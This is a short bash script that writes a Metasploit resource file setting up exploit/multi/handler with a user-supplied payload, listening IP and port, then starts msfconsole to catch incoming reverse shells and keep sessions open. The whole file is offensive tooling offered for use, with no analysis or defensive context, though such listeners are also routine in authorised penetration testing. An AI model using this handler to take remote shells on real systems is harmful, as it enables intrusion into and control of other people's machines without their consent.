#!/bin/bash

if [ $# -lt 3 ]; then
        echo "PAYLOAD IP and PORT need to be provided"
else
        PAYLOAD=$1
        IP=$(echo $2 | cut -d'=' -f2)
        PORT=$(echo $3 | cut -d'=' -f2)
        cat << EOF > ~/.reverse-shell.rc
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $IP
set LPORT $PORT
set ExitOnSession false
run
EOF
        msfconsole -q -r ~/.reverse-shell.rc
fi
